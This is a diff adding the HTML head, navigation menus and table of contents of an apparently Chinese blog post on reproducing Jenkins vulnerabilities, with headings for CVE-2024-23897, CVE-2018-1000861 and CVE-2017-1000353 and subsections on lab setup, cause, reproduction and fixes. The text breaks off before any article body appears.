@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="robots" content="noindex, nofollow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" id="favicon-svg" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+<title>Jenkins历史漏洞复现 – Parad0x7e&#39;s Blog</title>
+  <meta name="description" content="Jenkins 是一个基于 Java 开发的开源自动化服务器。" /><link rel="canonical" href="http://localhost:1313/vul/jenkins%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" />
+
+<meta property="og:title" content="Jenkins历史漏洞复现">
+<meta
+  property="og:description"
+  content="
+    
+      Jenkins 是一个基于 Java 开发的开源自动化服务器。
+    
+  ">
+<meta
+  property="og:type"
+  content="
+    article
+  ">
+<meta property="og:url" content="http://localhost:1313/vul/jenkins%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><meta property="article:section" content="vul">
+
+<meta
+  property="article:published_time"
+  content="2026-01-26T22:02:07+08:00">
+
+
+<meta
+  property="article:modified_time"
+  content="2026-01-26T22:02:07+08:00">
+
+
+
+  <meta itemprop="name" content="Jenkins历史漏洞复现">
+  <meta itemprop="description" content="Jenkins 是一个基于 Java 开发的开源自动化服务器。">
+  <meta itemprop="datePublished" content="2026-01-26T22:02:07+08:00">
+  <meta itemprop="dateModified" content="2026-01-26T22:02:07+08:00">
+  <meta itemprop="wordCount" content="492">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Jenkins历史漏洞复现">
+  <meta name="twitter:description" content="Jenkins 是一个基于 Java 开发的开源自动化服务器。">
+<link href="/css/compiled/main.css" rel="stylesheet" />
+    <link href="/css/variables.css" rel="stylesheet" />
+    <link href="/css/custom.css" rel="stylesheet" />
+
+  
+
+
+  <script>
+    
+
+    function setTheme(theme) {
+      document.documentElement.classList.remove("light", "dark");
+
+      if (theme !== "light" && theme !== "dark") {
+       theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+      }
+
+      document.documentElement.classList.add(theme);
+      document.documentElement.style.colorScheme = theme;
+    }
+
+    setTheme("color-theme" in localStorage ? localStorage.getItem("color-theme") : 'system')
+
+  </script>
+
+  <script>
+    
+
+    if (localStorage.getItem('banner-closed')) {
+      document.documentElement.style.setProperty("--hextra-banner-height", "0px");
+      document.documentElement.classList.add("hextra-banner-hidden");
+    }
+  </script>
+
+  
+  
+  </head>
+<body><div class="hextra-nav-container hx:sticky hx:top-0 hx:z-20 hx:w-full hx:bg-transparent hx:print:hidden">
+  <div
+    class="hextra-nav-container-blur hx:pointer-events-none hx:absolute hx:z-[-1] hx:h-full hx:w-full hx:bg-white hx:dark:bg-dark hx:shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] hx:contrast-more:shadow-[0_0_0_1px_#000] hx:dark:shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] hx:contrast-more:dark:shadow-[0_0_0_1px_#fff]"
+  ></div>
+
+  <nav class="hextra-max-navbar-width hx:mx-auto hx:flex hx:items-center hx:justify-end hx:gap-2 hx:h-16 hx:px-6">
+    <a class="hx:flex hx:items-center hx:hover:opacity-75 hx:ltr:mr-auto hx:rtl:ml-auto" href="/">
+    <img class="hx:mr-2 hx:block hx:dark:hidden" src="/images/logo.svg" alt="Logo" height="20" width="20" />
+    <img class="hx:mr-2 hx:hidden hx:dark:block" src="/images/logo.svg" alt="Dark Logo" height="20" width="20" />
+    <span class="hx:mr-2 hx:font-extrabold hx:inline hx:select-none" title="Parad0x7e&#39;s Blog">Parad0x7e&#39;s Blog</span>
+</a>
+<a
+  title=""
+  href="/arch"
+  
+  class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-flex hx:items-center hx:gap-1 hx:text-gray-600 hx:hover:text-gray-800 hx:dark:text-gray-400 hx:dark:hover:text-gray-200"
+><span class="hx:text-center">Arch</span>
+</a><a
+  title=""
+  href="/vul"
+  
+  class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-flex hx:items-center hx:gap-1 hx:font-medium"
+><span class="hx:text-center">Vuln Repro</span>
+</a><a
+  title=""
+  href="/wp"
+  
+  class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-flex hx:items-center hx:gap-1 hx:text-gray-600 hx:hover:text-gray-800 hx:dark:text-gray-400 hx:dark:hover:text-gray-200"
+><span class="hx:text-center">Write Up</span>
+</a><div class="hextra-search-wrapper hx:relative hx:md:w-64">
+  <div class="hx:relative hx:flex hx:items-center hx:text-gray-900 hx:contrast-more:text-gray-800 hx:dark:text-gray-300 hx:contrast-more:dark:text-gray-300">
+    <input
+      placeholder="搜索文档..."
+      class="hextra-search-input hx:focus:hextra-focus hx:block hx:w-full hx:appearance-none hx:rounded-lg hx:px-3 hx:py-2 hx:transition-colors hx:text-base hx:leading-tight hx:md:text-sm hx:bg-black/[.05] hx:dark:bg-gray-50/10 hx:focus:bg-white hx:dark:focus:bg-dark hx:placeholder:text-gray-500 hx:dark:placeholder:text-gray-400 hx:contrast-more:border hx:contrast-more:border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx:absolute hx:my-1.5 hx:select-none hx:ltr:right-1.5 hx:rtl:left-1.5 hx:h-5 hx:rounded-sm hx:bg-white hx:px-1.5 hx:font-mono hx:text-[10px] hx:font-medium hx:text-gray-500 hx:border hx:border-gray-200 hx:dark:border-gray-100/20 hx:dark:bg-dark/50 hx:contrast-more:border-current hx:contrast-more:text-current hx:contrast-more:dark:border-current hx:items-center hx:gap-1 hx:transition-opacity hx:pointer-events-none hx:hidden hx:sm:flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="hextra-search-results hextra-scrollbar hx:hidden hx:border hx:border-gray-200 hx:bg-white hx:text-gray-100 hx:dark:border-neutral-800 hx:dark:bg-neutral-900 hx:absolute hx:top-full hx:z-20 hx:mt-2 hx:overflow-auto hx:overscroll-contain hx:rounded-xl hx:py-2.5 hx:shadow-xl hx:max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] hx:md:max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx:inset-x-0 hx:ltr:md:left-auto hx:rtl:md:right-auto hx:contrast-more:border hx:contrast-more:border-gray-900 hx:contrast-more:dark:border-gray-50 hx:w-screen hx:min-h-[100px] hx:max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+
+          <a class="hx:p-2 hx:text-current" target="_blank" rel="noreferrer" href="https://github.com/Parad0x7e" title="GitHub"><svg height=24 fill="currentColor" viewBox="3 3 18 18">
+  <path d="M12 3C7.0275 3 3 7.12937 3 12.2276C3 16.3109 5.57625 19.7597 9.15374 20.9824C9.60374 21.0631 9.77249 20.7863 9.77249 20.5441C9.77249 20.3249 9.76125 19.5982 9.76125 18.8254C7.5 19.2522 6.915 18.2602 6.735 17.7412C6.63375 17.4759 6.19499 16.6569 5.8125 16.4378C5.4975 16.2647 5.0475 15.838 5.80124 15.8264C6.51 15.8149 7.01625 16.4954 7.18499 16.7723C7.99499 18.1679 9.28875 17.7758 9.80625 17.5335C9.885 16.9337 10.1212 16.53 10.38 16.2993C8.3775 16.0687 6.285 15.2728 6.285 11.7432C6.285 10.7397 6.63375 9.9092 7.20749 9.26326C7.1175 9.03257 6.8025 8.08674 7.2975 6.81794C7.2975 6.81794 8.05125 6.57571 9.77249 7.76377C10.4925 7.55615 11.2575 7.45234 12.0225 7.45234C12.7875 7.45234 13.5525 7.55615 14.2725 7.76377C15.9937 6.56418 16.7475 6.81794 16.7475 6.81794C17.2424 8.08674 16.9275 9.03257 16.8375 9.26326C17.4113 9.9092 17.76 10.7281 17.76 11.7432C17.76 15.2843 15.6563 16.0687 13.6537 16.2993C13.98 16.5877 14.2613 17.1414 14.2613 18.0065C14.2613 19.2407 14.25 20.2326 14.25 20.5441C14.25 20.7863 14.4188 21.0746 14.8688 20.9824C16.6554 20.364 18.2079 19.1866 19.3078 17.6162C20.4077 16.0457 20.9995 14.1611 21 12.2276C21 7.12937 16.9725 3 12 3Z"></path>
+</svg>
+<span class="hx:sr-only">GitHub</span>
+          </a><button type="button" aria-label="Menu" class="hextra-hamburger-menu hx:cursor-pointer hx:-mr-2 hx:rounded-sm hx:p-2 hx:active:bg-gray-400/20 hx:md:hidden"><svg height=24 fill="none" viewBox="0 0 24 24" stroke="currentColor"><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8H20"></path></g><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16H20"></path></g></svg></button>
+  </nav>
+</div>
+
+  <div class="hx:mx-auto hx:flex hextra-max-page-width">
+    <aside class="hextra-sidebar-container hx:flex hx:flex-col hx:print:hidden hx:md:top-16 hx:md:shrink-0 hx:md:w-64 hx:md:self-start hx:max-md:[transform:translate3d(0,-100%,0)] hx:md:hidden hx:xl:block">
+  
+  <div class="hx:px-4 hx:pt-4 hx:md:hidden">
+    <div class="hextra-search-wrapper hx:relative hx:md:w-64">
+  <div class="hx:relative hx:flex hx:items-center hx:text-gray-900 hx:contrast-more:text-gray-800 hx:dark:text-gray-300 hx:contrast-more:dark:text-gray-300">
+    <input
+      placeholder="搜索文档..."
+      class="hextra-search-input hx:focus:hextra-focus hx:block hx:w-full hx:appearance-none hx:rounded-lg hx:px-3 hx:py-2 hx:transition-colors hx:text-base hx:leading-tight hx:md:text-sm hx:bg-black/[.05] hx:dark:bg-gray-50/10 hx:focus:bg-white hx:dark:focus:bg-dark hx:placeholder:text-gray-500 hx:dark:placeholder:text-gray-400 hx:contrast-more:border hx:contrast-more:border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx:absolute hx:my-1.5 hx:select-none hx:ltr:right-1.5 hx:rtl:left-1.5 hx:h-5 hx:rounded-sm hx:bg-white hx:px-1.5 hx:font-mono hx:text-[10px] hx:font-medium hx:text-gray-500 hx:border hx:border-gray-200 hx:dark:border-gray-100/20 hx:dark:bg-dark/50 hx:contrast-more:border-current hx:contrast-more:text-current hx:contrast-more:dark:border-current hx:items-center hx:gap-1 hx:transition-opacity hx:pointer-events-none hx:hidden hx:sm:flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="hextra-search-results hextra-scrollbar hx:hidden hx:border hx:border-gray-200 hx:bg-white hx:text-gray-100 hx:dark:border-neutral-800 hx:dark:bg-neutral-900 hx:absolute hx:top-full hx:z-20 hx:mt-2 hx:overflow-auto hx:overscroll-contain hx:rounded-xl hx:py-2.5 hx:shadow-xl hx:max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] hx:md:max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx:inset-x-0 hx:ltr:md:left-auto hx:rtl:md:right-auto hx:contrast-more:border hx:contrast-more:border-gray-900 hx:contrast-more:dark:border-gray-50 hx:w-screen hx:min-h-[100px] hx:max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+
+  </div>
+  <div class="hextra-scrollbar hx:overflow-y-auto hx:overflow-x-hidden hx:p-4 hx:grow hx:md:h-[calc(100vh-var(--navbar-height)-var(--menu-height))]">
+    <ul class="hx:flex hx:flex-col hx:gap-1 hx:md:hidden">
+      
+      
+          <li class=""><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/wp/"
+    
+  >Wp
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a><div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/wp/ilovectf2025-wp/"
+    
+  >?CTF2025 WP
+    </a>
+              
+            </li><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/wp/newstarctf2025-wp/"
+    
+  >NewStarCTF2025 WP
+    </a>
+              
+            </li></ul>
+      </div></li>
+          <li class="open"><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/vul/"
+    
+  >Vul
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a><div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/vul/zabbix%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+    
+  >Zabbix历史漏洞复现
+    </a>
+              
+            </li><li class="hx:flex hx:flex-col open"><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hextra-sidebar-active-item hx:bg-primary-100 hx:font-semibold hx:text-primary-800 hx:contrast-more:border hx:contrast-more:border-primary-500 hx:dark:bg-primary-400/10 hx:dark:text-primary-600 hx:contrast-more:dark:border-primary-500"
+    href="/vul/jenkins%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+    
+  >Jenkins历史漏洞复现
+    </a>
+  
+    <ul class='hx:flex hx:flex-col hx:gap-1 hx:relative hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:dark:before:bg-neutral-800 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:pr-3 hx:rtl:before:right-0 hx:ltr:ml-3 hx:rtl:mr-3'><li>
+              <a
+                href="#%e4%bb%8b%e7%bb%8d"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >介绍</a>
+            </li>
+          <li>
+              <a
+                href="#jenkins-cli-%e6%8e%a5%e5%8f%a3%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96%e6%bc%8f%e6%b4%9ecve-2024-23897"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）</a>
+            </li>
+          <li>
+              <a
+                href="#jenkins-%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9ecve-2018-1000861"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Jenkins 远程代码执行漏洞（CVE-2018-1000861）</a>
+            </li>
+          <li>
+              <a
+                href="#jenkins-cli-%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9ecve-2017-1000353"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Jenkins-CLI 远程代码执行漏洞（CVE-2017-1000353）</a>
+            </li>
+          </ul>
+  
+              
+            </li></ul>
+      </div></li>
+          <li class=""><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/arch/"
+    
+  >Arch
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a><div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/arch/%E5%9C%A8ubuntu%E4%B8%AD%E5%BD%BB%E5%BA%95%E5%88%A0%E9%99%A4snap/"
+    
+  >在Ubuntu中彻底删除SNAP
+    </a>
+              
+            </li></ul>
+      </div></li>
+    </ul>
+
+    <div class="hx:max-xl:hidden hx:h-0 hx:w-64 hx:shrink-0"></div></div>
+  
+  </aside>
+    
+<nav class="hextra-toc hx:order-last hx:hidden hx:w-64 hx:shrink-0 hx:xl:block hx:print:hidden hx:px-4" aria-label="table of contents">
+    <div class="hextra-scrollbar hx:sticky hx:top-16 hx:overflow-y-auto hx:pr-4 hx:pt-6 hx:text-sm [hyphens:auto] hx:max-h-[calc(100vh-var(--navbar-height)-env(safe-area-inset-bottom))] hx:ltr:-mr-4 hx:rtl:-ml-4"><p class="hx:mb-4 hx:font-semibold hx:tracking-tight">此页上</p><ul>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e4%bb%8b%e7%bb%8d">介绍
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#jenkins-cli-%e6%8e%a5%e5%8f%a3%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96%e6%bc%8f%e6%b4%9ecve-2024-23897">Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e9%9d%b6%e5%9c%ba%e6%90%ad%e5%bb%ba">靶场搭建
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86">漏洞原理
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0">漏洞复现
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e5%a6%82%e4%bd%95%e4%bf%ae%e5%a4%8d">如何修复
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#jenkins-%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9ecve-2018-1000861">Jenkins 远程代码执行漏洞（CVE-2018-1000861）
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e9%9d%b6%e5%9c%ba%e6%90%ad%e5%bb%ba-1">靶场搭建
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
